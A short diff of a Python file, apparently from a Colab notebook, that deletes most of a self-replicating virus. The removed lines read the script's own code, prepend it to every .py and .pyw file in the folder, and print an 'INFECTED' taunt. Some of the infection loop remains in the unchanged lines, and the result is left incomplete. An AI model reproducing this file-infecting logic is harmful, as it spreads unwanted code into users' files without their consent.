@@ -7,24 +7,8 @@ Original file is located at
     https://colab.research.google.com/drive/1GTR-Za3d6O4cO9eeokkFDTVnFQjEftPS
 """
 
-# VIRUS SAYS HI!
 
-import sys
-import glob
 
-virus_code = []
-
-with open(sys.argv[0], 'r') as f:
-    lines = f.readlines()
-
-self_replicating_part = False
-for line in lines:
-    if line == "# VIRUS SAYS HI!":
-        self_replicating_part = True
-    if not self_replicating_part:
-        virus_code.append(line)
-    if line == "# VIRUS SAYS BYE!\n":
-        break
 
 python_files = glob.glob('*.py') + glob.glob('*.pyw')
 
@@ -46,11 +30,6 @@ for file in python_files:
         final_code.extend(file_code)
 
         with open(file, 'w') as f:
-            f.writelines(final_code)
 
-def malicious_code():
-    print("YOU HAVE BEEN INFECTED HAHAHA !!!")
-
-malicious_code()
 
 # VIRUS SAYS BYE!
